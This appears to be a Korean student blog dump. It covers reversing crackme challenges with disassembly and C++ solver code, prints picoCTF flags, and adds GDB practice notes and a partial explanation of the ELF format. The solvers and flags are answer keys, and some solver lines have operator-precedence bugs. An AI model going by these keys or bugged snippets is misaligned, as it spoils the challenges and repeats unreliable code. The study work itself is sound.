byte_140003000 ; rcx = *bytes movzx eax, byte ptr [rcx+rax] ; eax = bytes[i] movsxd rcx, [rsp+18h+var_18] ; rcx = i mov rdx, [rsp+18h+arg_0] ; rdx = input movzx ecx, byte ptr [rdx+rcx] ; ecx = input[i] xor ecx, [rsp+18h+var_18] ; ecx = input[i] ^ i mov edx, [rsp+18h+var_18] ; edx = i lea ecx, [rcx+rdx*2] ; ecx = input[i] ^ i + i * 2 cmp eax, ecx ; bytes[i] - (input[i] ^ i + i * 2) jz short loc_140001051 bytes[i]와 input[i] ^ i + i * 2를 비교하여 같으면 inc eax 후에 계속 반복하고, 다르다면 0을 반환시킨다. [rsp+18h+var_18]가 0x18이 될 때까지 두 값이 같으면 1을 반환한다.\n따라서 식을 정리하여 input[i]의 값을 구하면 될 것 같다.\nbytes[i] = input[i] ^ i + i * 2 식을 input[i] 항만 남기고 나머지를 이항하면 input[i] = (bytes[i] - i * 2) ^ i와 같이 나타낼 수 있다. 따라서 (bytes[i] - i * 2) ^ i 값에 i를 0부터 0x18까지 대입하여 출력하면 올바른 입력값이 출력될 것이다.\nC++을 이용해 입력값을 구하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { unsigned char bytes[0x18] = { 0x49, 0x60, 0x67, 0x74, 0x63, 0x67, 0x42, 0x66, 0x80, 0x78, 0x69, 0x69, 0x7B, 0x99, 0x6D, 0x88, 0x68, 0x94, 0x9F, 0x8D, 0x4D, 0xA5, 0x9D, 0x45 }; for (int i = 0; i \u0026lt; 0x18; i++) { cout \u0026lt;\u0026lt; (bytes[i] - i * 2) ^ i; } return 0; } rev-basic-4 이전 문제들과 같은 구조이기 때문에 값을 비교하는 부분만 분석하도록 하겠다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 movsxd rax, [rsp+18h+var_18] ; rax = i mov rcx, [rsp+18h+arg_0] ; rcx = input movzx eax, byte ptr [rcx+rax] ; eax = input[i] sar eax, 4 ; eax = input[i] \u0026gt;\u0026gt; 4 movsxd rcx, [rsp+18h+var_18] ; rcx = i mov rdx, [rsp+18h+arg_0] ; rdx = input movzx ecx, byte ptr [rdx+rcx] ; ecx = input[i] shl ecx, 4 ; ecx = input[i] \u0026lt;\u0026lt; 4 and ecx, 0F0h ; ecx = ecx \u0026amp; 0xF0 or eax, ecx ; eax = (input[i] \u0026gt;\u0026gt; 4) | (input \u0026lt;\u0026lt; 4) movsxd rcx, [rsp+18h+var_18] ; rcx = i lea rdx, unk_140003000 ; rdx = bytes movzx ecx, byte ptr [rdx+rcx] ; ecx = bytes[i] cmp eax, ecx ; (input[i] \u0026gt;\u0026gt; 4) | (input[i] \u0026lt;\u0026lt; 4) - bytes[i] jz short loc_140001063 (input[i] \u0026gt;\u0026gt; 4) | (input[i] \u0026lt;\u0026lt; 4) 식은 input[i]의 상위 4비트와 하위 4비트를 서로 바꾸는 연산이다. 따라서 이 값이 bytes[i]와 같으니 원래 값인 input[i]를 구하려면 bytes[i]의 상위 4비트와 하위 4비트 값을 바꿔주면 된다.\nC++을 이용해 입력값을 구하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { unsigned char bytes[0x1C] = { 0x24, 0x27, 0x13, 0xC6, 0xC6, 0x13, 0x16, 0xE6, 0x47, 0xF5, 0x26, 0x96, 0x47, 0xF5, 0x46, 0x27, 0x13, 0x26, 0x26, 0xC6, 0x56, 0xF5, 0xC3, 0xC3, 0xF5, 0xE3, 0xE3, 0x00 }; for (int i = 0; i \u0026lt; 0x1C; i++) { cout \u0026lt;\u0026lt; (bytes[i] \u0026gt;\u0026gt; 4) | (bytes[i] \u0026lt;\u0026lt; 4); } return 0; } rev-basic-5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 movsxd rax, [rsp+18h+var_18] ; rax = i mov rcx, [rsp+18h+arg_0] ; rcx = input movzx eax, byte ptr [rcx+rax] ; eax = input[i] mov ecx, [rsp+18h+var_18] ; ecx = i inc ecx ; ecx = i + 1 movsxd rcx, ecx ; rcx = i + 1 mov rdx, [rsp+18h+arg_0] ; rdx = input movzx ecx, byte ptr [rdx+rcx] ; ecx = input[i + 1] add eax, ecx ; eax = input[i] + input[i + 1] movsxd rcx, [rsp+18h+var_18] ; rcx = i lea rdx, unk_140003000 ; rdx = bytes movzx ecx, byte ptr [rdx+rcx] ; ecx = bytes[i] cmp eax, ecx ; (input[i] + input[i + 1]) - bytes[i] jz short loc_14000105B input[i] + input[i + 1]의 연산 결과가 bytes[i]와 같아야 한다. 하지만 input[i]를 구하려면 input[i+1]을 구해야 해서 단순히 역연산으로 동시에 구하는 것은 불가능하다.\nbytes에 해당하는 unk_140003000의 값을 확인해보면 아래와 같다.\n1 2 AD D8 CB CB 9D 97 CB C4 92 A1 D2 D7 D2 D6 A8 A5 DC C7 AD A3 A1 98 4C 00 여기서 마지막 값이 널 문자인 것을 확인할 수 있는데, 이를 통해 input 배열의 마지막 값이 4C - 0으로 4C인 것을 알 수 있다. 따라서 마지막 값의 바로 전 값도 같은 방식으로 구할 수 있고, 이를 통해 전체 문자열을 거꾸로 한 문자씩 구할 수 있다.\nC++을 이용해 입력값을 구하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { unsigned char bytes[0x18] = { 0xAD, 0xD8, 0xCB, 0xCB, 0x9D, 0x97, 0xCB, 0xC4, 0x92, 0xA1, 0xD2, 0xD7, 0xD2, 0xD6, 0xA8, 0xA5, 0xDC, 0xC7, 0xAD, 0xA3, 0xA1, 0x98, 0x4C, 0x00 }; unsigned char res[0x19] = {0}; for (int i = 0x17; i \u0026gt; -1; i--) { res[i] = bytes[i] - res[i + 1]; } for (int i = 0; i\u0026lt; 0x18; i++) { cout \u0026lt;\u0026lt; res[i]; } return 0; } rev-basic-6 1 2 3 4 5 6 7 8 9 10 movsxd rax, [rsp+18h+var_18] ; rax = i mov rcx, [rsp+18h+arg_0] ; rcx = input movzx eax, byte ptr [rcx+rax] ; eax = input[i] lea rcx, unk_140003020 ; rcx = table movzx eax, byte ptr [rcx+rax] ; eax = table[input[i]] movsxd rcx, [rsp+18h+var_18] ; rcx = i lea rdx, unk_140003000 ; rdx = bytes movzx ecx, byte ptr [rdx+rcx] ; ecx = bytes[i] cmp eax, ecx ; table[input[i]] - bytes[i] jz short loc_140001053 따라서 table 배열에서 bytes[i]과 같은 값의 인덱스가 input[i]인 것이다.\nC++을 이용해 입력값을 구하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { unsigned char bytes[0x12] = { 0x00, 0x4D, 0x51, 0x50, 0xEF, 0xFB, 0xC3, 0xCF, 0x92, 0x45, 0x4D, 0xCF, 0xF5, 0x04, 0x40, 0x50, 0x43, 0x63 }; unsigned char table[0x100] = { 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16 }; for (int i = 0; i \u0026lt; 0x12; i++) { for (int j = 0; j \u0026lt; 0x90; j++) { if (bytes[i] == table[j]) cout \u0026lt;\u0026lt; static_cast\u0026lt;char\u0026gt;(j); } } return 0; } CTFd R5 Custom 1 입력받은 문자열과 s2 문자열을 비교하여 같으면 Correct를 출력한다. 따라서 s2 문자열이 플래그가 되는데, s2의 문자열은 HIBYTE(v5) ^ *((_BYTE *)v10 + i)와 같다.\n여기서 HIBYTE(v5)의 값은 66이고, v10과 s2의 크기가 다른데, v10[32]는 v11과 같다.\nC++을 이용해 입력값을 구하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { long long v10[4]; v10[0] = 0x31397530273B230ELL; v10[1] = 0x292B2E1D27302336LL; v10[2] = 0x2B2A213623351D27LL; v10[3] = 0x31302336311D252CLL; unsigned char v11 = 63; unsigned char *ptr = (unsigned char*)v10; for (int i = 0; i \u0026lt; 32; ++i) { cout \u0026lt;\u0026lt; static_cast\u0026lt;char\u0026gt;(66 ^ ptr[i]); } cout \u0026lt;\u0026lt; static_cast\u0026lt;char\u0026gt;(66 ^ v11); return 0; } Custom 2 check2 함수의 반환값이 1이 되도록 하는 입력값 v5가 플래그인 것 같다.\ncheck2 함수를 확인해보면 인자인 a1에 특정 연산을 거쳐 v3의 값과 비교하여 검증하는 것으로 보인다.\n(unsigned __int8)rol(*(unsigned __int8 *)(i + a1), (unsigned int)(i % 8 + 1)) + 5 != *((_BYTE *)v3 + i) 식을 정리해보면 rol(a1[i], i % 8 + 1) + 5 != v3[i]와 같다.\n따라서 a1[i]은 과 같다.\nrol 함수는 첫 번째 인자의 값을 두 번째 인자의 값만큼 왼쪽으로 비트 쉬프트 연산을 하고, 잘린 값이 오른쪽으로 다시 돌아오는 비트 순환 연산이다. 이를 반대로 하는 ror 함수를 구현하여 역연산을 할 수 있다.\nC++을 이용해 입력값을 구하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int ror (int x, int n) { return (x \u0026gt;\u0026gt; n) | ((x \u0026lt;\u0026lt; (8 - n)) \u0026amp; 0xFF); } int main() { long long v3[7]; v3[0] = 0x59C2D2535BD08A9DLL; v3[1] = 0x66B85AB29AAE1EB3LL; v3[2] = 0x661D95343B784AB5LL; v3[3] = 0x661E53ED2B405A93LL; v3[4] = 0x4EBF20ED9978D9B3LL; v3[5] = 0x5FB857104BB8B695LL; v3[6] = 0x82A354F33B68B6B5LL; unsigned char *ptr = (unsigned char*)v3; for (int i = 0; i \u0026lt; 56; i++) { cout \u0026lt;\u0026lt; static_cast\u0026lt;char\u0026gt;(ror(ptr[i] - 5, i % 8 + 1)); } return 0; } Custom 3 이 문제 또한 입력받은 문자열을 check3 함수로 전달하여 검증하는 것으로 보인다.\n검증하는 식은 *(_BYTE *)(i + a1) + *((_BYTE *)\u0026amp;v3 + i % 5) != *((_BYTE *)v5 + i)이다.\nv5는 \u0026quot;Mc|iw8}Tr[1KKp{eUErg4Sjf\\\\Vi]rOwdVFyfUEs_XHnMMSxLK66KJ^q[ZTkVX7nMJlpeWGz\\\\ZJpfUE4g\u0026quot; 문자열에 뒤에 0x806E5B5D656E447ALL를 더한 값이고, v3는 hex로 변환하면 0x4030201인데, 여기에 v4의 값인 5를 더하면 1 ~ 5로 구성된 배열이 된다.\nC++을 이용해 입력값을 구하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { char v5[88] = \u0026#34;Mc|iw8}Tr[1KKp{eUErg4Sjf\\\\Vi]rOwdVFyfUEs_XHnMMSxLK66KJ^q[ZTkVX7nMJlpeWGz\\\\ZJpfUE4g\u0026#34;; *(long long*)(v5 + 80) = 0x806E5B5D656E447ALL; unsigned char v3[5] = {0x01, 0x02, 0x03, 0x04, 0x05}; unsigned char *ptr = (unsigned char*)v5; for (int i = 0; i \u0026lt; 88; i++) { cout \u0026lt;\u0026lt; static_cast\u0026lt;char\u0026gt;(ptr[i] - v3[i % 5]); } return 0; } [PicoCTF] file-run1 1 2 3 Documents/Coding/test via C v13.3.0-gcc via 🐍 v3.12.3 ❯ ./Pico_run1 The flag is: picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b} 실행하니까 그냥 플래그를 준다.\n[PicoCTF] file-run2 1 2 3 4 5 6 7 8 9 10 11 Documents/Coding/test via C v13.3.0-gcc via 🐍 v3.12.3 ❯ ./Pico_run2 Run this file with only one argument. Documents/Coding/test via C v13.3.0-gcc via 🐍 v3.12.3 ❯ ./Pico_run2 a Won\u0026#39;t you say \u0026#39;Hello!\u0026#39; to me first? Documents/Coding/test via C v13.3.0-gcc via 🐍 v3.12.3 ❯ ./Pico_run2 Hello! The flag is: picoCTF{F1r57_4rgum3n7_96f2195f} 인사하라고 해서 인사해줬더니 플래그를 준다.\nMerong aEae41779bdf799 값이 플래그인 것 같다.\nText view에서 확인할 수 있다.\n","date":"2025-06-13T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-5%EC%B0%A8%EC%8B%9C/","title":"Layer7 리버싱 5차시"},{"content":"GDB Handray 실습 정리 실습 예제 코드 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; int divide(int a, int b) { if (b == 0) return -1; return a / b; } int main() { int x = 12; int y = 0; int z = divide(x, y); printf(\u0026#34;Result: %d\\n\u0026#34;, z); return 0; } 풀이 정리 gdb를 실행하고 b divide if b == 0 명령어를 통해 divide 함수에서 나누는 값이 0일 때 중단하도록 설정하였다.\n실행을 해보니 divide 함수의 나누는 값인 두 번째 인자인 b가 0이므로 중단된 것을 확인할 수 있다.\nprint 명령어로 인자인 a와 b의 값을 확인할 수 있다.\ninfo args 명령어로 divide 함수의 인자 값을 확인할 수 있고, step 명령어로 함수를 빠져나와 info locals 명령어로 divide 함수의 반환값이 저장된 z 변수를 비롯한 지역 변수들을 확인할 수 있다.\nbacktrace 명령어로 스택에 쌓인 호출된 함수를 확인할 수 있다.\ndisplay a 명령어로 매 실행마다 변수의 값을 출력하도록 설정할 수 있다.\n실습 예제 코드 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; void print_message(const char *msg) { printf(\u0026#34;%s\\n\u0026#34;, msg); } void call_wrapper() { print_message(\u0026#34;tracing into function\u0026#34;); } int main() { call_wrapper(); return 0; } 풀이 정리 gdb를 실행하고 b print_message 명령어로 중단점을 설정하고 실행하였다.\ndisas print_message 명령어로 print_message 함수의 어셈블리어 코드를 확인해볼 수 있다.\n1 2 3 4 0x0000555555555149 \u0026lt;+0\u0026gt;: endbr64 ; ROT 공격 방지 0x000055555555514d \u0026lt;+4\u0026gt;: push rbp ; 베이스 포인터 저장 0x000055555555514e \u0026lt;+5\u0026gt;: mov rbp,rsp ; 스택 프레임 설정 0x0000555555555151 \u0026lt;+8\u0026gt;: sub rsp,0x10 ; 스택 16byte 할당 함수의 프롤로그다. 베이스 포인터를 저장하고, 새 스택 프레임을 설정해주는 것을 확인할 수 있다. 16byte의 공간을 할당하는 이유는 인자인 문자열 포인터를 저장하기 위해 8byte를 필요로 하는데, 스택 포인터를 16byte의 배수인 주소에 위치하여 정렬해야 하기 때문이다.\n1 2 3 4 5 0x0000555555555155 \u0026lt;+12\u0026gt;: mov QWORD PTR [rbp-0x8],rdi ; 인자 스택에 저장 0x0000555555555159 \u0026lt;+16\u0026gt;: mov rax,QWORD PTR [rbp-0x8] ; 인자 rax에 복사 0x000055555555515d \u0026lt;+20\u0026gt;: mov rdi,rax ; 인자 rdi에 0x0000555555555160 \u0026lt;+23\u0026gt;: call 0x555555555050 \u0026lt;puts@plt\u0026gt;; put 함수 호출 0x0000555555555165 \u0026lt;+28\u0026gt;: nop ; 패딩 인자를 스택에 저장한 뒤, rax 레지스터에 복사하고 다시 rdi 레지스터에 복사한다. 그리고 rdi 레지스터를 인자로 puts 함수를 호출한다. 사실상 위 세 줄은 필요가 없는데, 컴파일 최적화가 되지 않아서 그렇다. -O2나 -O3 옵션을 사용하면 최적화하여 컴파일할 수 있다. 마지막 패딩은 위에서 설명한 스택 정렬 때문이다.\n1 2 0x0000555555555166 \u0026lt;+29\u0026gt;: leave ; 스택 프레임 정리 0x0000555555555167 \u0026lt;+30\u0026gt;: ret ; 반환 함수의 에필로그다. 함수의 스택 프레임을 정리한 뒤 반환한다.\nx/i $rip 명령어나 layout 명령어를 통해 어셈블리어를 실행하며 확인해볼 수 있다.\n직접 예제 만들고 실습 예제 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; void print(char* str, int n) { for (int i = 0; i \u0026lt; n; i++) { printf(\u0026#34;%s\\n\u0026#34;, str); } } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); if (n \u0026gt; 0) print(\u0026#34;과제하기귀찮다\u0026#34;, n); else printf(\u0026#34;출력 횟수 음수 불가능\u0026#34;); return 0; } 실습 정리 b main 명령어로 main 함수에 중단점을 설정하고 실행하였다.\nlayout asm 명령어로 한 줄씩 분석해보았다. (분석하는 모든 과정을 캡쳐하긴 어려워 설명이 중요한 부분만 사진을 삽입하였다.)\n1 2 3 4 5 6 0x5555555550c0 \u0026lt;main\u0026gt;: endbr64 0x5555555550c4 \u0026lt;main+4\u0026gt;: sub rsp,0x18 0x5555555550c8 \u0026lt;main+8\u0026gt;: lea rdi,[rip+0xf35] # 0x555555556004 0x5555555550cf \u0026lt;main+15\u0026gt;: mov rax,QWORD PTR fs:0x28 0x5555555550d8 \u0026lt;main+24\u0026gt;: mov QWORD PTR [rsp+0x8],rax 0x5555555550dd \u0026lt;main+29\u0026gt;: xor eax,eax 스택 공간을 할당하고 스택 카나리를 설정한다. 카나리는 BOF 공격으로 스택이 변조되었는지 확인하기 위한 값이다.\n세 번째 줄은 scanf의 첫 번째 인자인 서식 지정자 %d 문자열을 복사하는 코드이다.\n1 2 3 4 5 6 7 0x5555555550df \u0026lt;main+31\u0026gt;: lea rsi,[rsp+0x4] 0x5555555550e4 \u0026lt;main+36\u0026gt;: call 0x5555555550b0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x5555555550e9 \u0026lt;main+41\u0026gt;: mov esi,DWORD PTR [rsp+0x4] 0x5555555550ed \u0026lt;main+45\u0026gt;: test esi,esi 0x5555555550ef \u0026lt;main+47\u0026gt;: jle 0x555555555114 \u0026lt;main+84\u0026gt; 0x5555555550f1 \u0026lt;main+49\u0026gt;: lea rdi,[rip+0xf0f] # 0x555555556007 0x5555555550f8 \u0026lt;main+56\u0026gt;: call 0x555555555220 \u0026lt;print\u0026gt; [rsp+0x4]에 숫자를 입력받고, 이 값이 0보다 작으면 \u0026lt;main+84\u0026gt;로 분기하고 아니면 [rip+0xf0f]값(\u0026ldquo;과제하기귀찮다\u0026rdquo;)을 인자로 print 함수를 호출한다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 0x555555555220 \u0026lt;print\u0026gt;: endbr64 0x555555555224 \u0026lt;print+4\u0026gt;: test esi,esi 0x555555555226 \u0026lt;print+6\u0026gt;: jle 0x555555555250 \u0026lt;print+48\u0026gt; 0x555555555228 \u0026lt;print+8\u0026gt;: push r12 0x55555555522a \u0026lt;print+10\u0026gt;: mov r12,rdi 0x55555555522d \u0026lt;print+13\u0026gt;: push rbp 0x55555555522e \u0026lt;print+14\u0026gt;: mov ebp,esi 0x555555555230 \u0026lt;print+16\u0026gt;: push rbx 0x555555555231 \u0026lt;print+17\u0026gt;: xor ebx,ebx 0x555555555233 \u0026lt;print+19\u0026gt;: nop DWORD PTR [rax+rax*1+0x0] ; 정렬용 패딩 0x555555555238 \u0026lt;print+24\u0026gt;: mov rdi,r12 0x55555555523b \u0026lt;print+27\u0026gt;: add ebx,0x1 0x55555555523e \u0026lt;print+30\u0026gt;: call 0x555555555080 \u0026lt;puts@plt\u0026gt; 0x555555555243 \u0026lt;print+35\u0026gt;: cmp ebp,ebx 0x555555555245 \u0026lt;print+37\u0026gt;: jne 0x555555555238 \u0026lt;print+24\u0026gt; 0x555555555247 \u0026lt;print+39\u0026gt;: pop rbx 0x555555555248 \u0026lt;print+40\u0026gt;: pop rbp 0x555555555249 \u0026lt;print+41\u0026gt;: pop r12 0x55555555524b \u0026lt;print+43\u0026gt;: ret 0x55555555524c \u0026lt;print+44\u0026gt;: nop DWORD PTR [rax+0x0] ; 정렬용 패딩 0x555555555250 \u0026lt;print+48\u0026gt;: ret 입력받은 n이 저장된 esi 레지스터의 값이 0이 될 때까지 puts 함수를 호출하고 esi 레지스터 값을 ebp 레지스터에 저장하여 ebx 레지스터를 카운터로 사용해 두 레지스터의 값이 같을 때까지 반복하여 호출한다.\ninfo args 명령어로 인자를 확인해보면 잘 불러와진 것을 확인할 수 있다.\ninfo stack과 info frame 또한 정상적으로 나오는 것을 확인할 수 있다.\n1 2 3 4 5 6 0x5555555550fd \u0026lt;main+61\u0026gt;: mov rax,QWORD PTR [rsp+0x8] 0x555555555102 \u0026lt;main+66\u0026gt;: sub rax,QWORD PTR fs:0x28 0x55555555510b \u0026lt;main+75\u0026gt;: jne 0x555555555129 \u0026lt;main+105\u0026gt; 0x55555555510d \u0026lt;main+77\u0026gt;: xor eax,eax 0x55555555510f \u0026lt;main+79\u0026gt;: add rsp,0x18 0x555555555113 \u0026lt;main+83\u0026gt;: ret print 함수가 반환되면, 스택 카나리를 검사하고 eax 레지스터를 0으로 초기화하여 종료 코드 0으로 반환한다.\n","date":"2025-06-10T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-4%EC%B0%A8%EC%8B%9C/","title":"Layer7 리버싱 4차시"},{"content":"수업 내용 정리 gdb란? Gnu DeBugger의 약자로, 프로그램을 런타임에서 디버깅하는 도구다.\n다양한 유닉스 기반 시스템에서 동작하며 C, C++, Java, Go, Rust 등 다양한 언어를 지원한다.\ngdb 명령어 시작과 종료 gdb [프로그램명] : 프로그램 시작 quit, q : GDB 종료 소스 보기 list : main 함수를 기점으로 소스 출력 list [라인 번호] : 특정 라인을 기준으로 출력 list [함수명] : 함수의 소스를 출력 list - : 출력된 행의 이전 행을 출력 list [파일명]:[함수명] : 파일의 특정 함수 소스를 출력 layout asm : 어셈블리 코드를 보여주는 창 추가 브레이크 포인트 설정: break [함수명] : 특정 함수 시작 부분에 브레이크 포인트 설정 break [라인 번호] : 특정 라인에 브레이크 포인트 설정 info break : 설정된 브레이크 포인트 확인 delete [브레이크 포인트 번호] : 브레이크 포인트 삭제 disable/enable [브레이크 포인트 번호] : 브레이크 포인트 활성화/비활성화 프로그램 실행: run, r : 프로그램 실행 continue, c : 브레이크 포인트에서 실행을 다시 시작 step : 한 라인씩 실행 next : 한 라인씩 실행 (함수 호출 시에는 함수 안으로 들어가지 않고, 다음 라인으로 넘어감) finish : 현재 함수를 완료할 때까지 실행 return [값] : 함수를 강제로 종료하고 값을 반환 advance [라인 번호] : 특정 라인까지 프로그램 실행 advance [파일:라인 번호] : 특정 파일의 특정 라인까지 프로그램 실행 변수 확인 print [변수명] : 변수 값 출력 info variables : 모든 변수 출력 watch [변수명] : 변수가 변경될 때 브레이크 포인트 설정 메모리 확인 x/n [형식] [주소] : 특정 메모리 주소의 내용을 특정 형식으로 출력 info address [변수명] : 변수의 메모리 주소 확인 info stack : 스택 상태 확인 info frame : 현재 함수의 프레임 정보를 출력 ELF 파일 구조 ELF 파일은 유닉스 계열 운영체제에서 사용되는 표준 바이너리 파일 포맷이다.\nELF 파일은 위와 같이 크게 ELF Header, Program Header Table, Section Header Table로 구성된다.\nELF Header ELF 파일의 시작 부분에 위치하며, 파일의 구조 및 속성을 정의한다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2\u0026#39;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Position-Independent Executable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x10c0 Start of program headers: 64 (bytes into file) Start of section headers: 14616 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 13 Size of section headers: 64 (bytes) Number of section headers: 31 Section header string table index: 30 파일의 종류를 나타내는 매직넘버와 데이터 저장 방식, OS, 아키텍처, 헤더의 크기 등 파일에 관한 정보들이 담겨있다.\nProgram Header Table 실행에 필요한 정보를 담고 있으며, 커널이 ELF 파일을 실행할 때 이 정보를 참고해서 메모리에 어떻게 적재할지를 결정한다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000000040 0x0000000000000040 0x00000000000002d8 0x00000000000002d8 R 0x8 INTERP 0x0000000000000318 0x0000000000000318 0x0000000000000318 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000888 0x0000000000000888 R 0x1000 LOAD 0x0000000000001000 0x0000000000001000 0x0000000000001000 0x00000000000002e9 0x00000000000002e9 R E 0x1000 LOAD 0x0000000000002000 0x0000000000002000 0x0000000000002000 0x00000000000000ec 0x00000000000000ec R 0x1000 LOAD 0x0000000000002d88 0x0000000000003d88 0x0000000000003d88 0x0000000000000288 0x00000000000004f8 RW 0x1000 DYNAMIC 0x0000000000002d98 0x0000000000003d98 0x0000000000003d98 0x0000000000000200 0x0000000000000200 RW 0x8 NOTE 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 NOTE 0x0000000000000368 0x0000000000000368 0x0000000000000368 0x0000000000000044 0x0000000000000044 R 0x4 GNU_PROPERTY 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 GNU_EH_FRAME 0x0000000000002008 0x0000000000002008 0x0000000000002008 0x0000000000000034 0x0000000000000034 R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 GNU_RELRO 0x0000000000002d88 0x0000000000003d88 0x0000000000003d88 0x0000000000000278 0x0000000000000278 R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 03 .init .plt .plt.got .plt.sec .text .fini 04 .rodata .eh_frame_hdr .eh_frame 05 .init_array .fini_array .dynamic .got .data .bss 06 .dynamic 07 .note.gnu.property 08 .note.gnu.build-id .note.ABI-tag 09 .note.gnu.property 10 .eh_frame_hdr 11 12 .init_array .fini_array .dynamic .got 구조체에는 아래와 같은 필드들이 저장되어 있다.\n1 2 3 4 5 6 7 8 9 10 struct Elf64_Phdr { Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset; Elf64_Addr 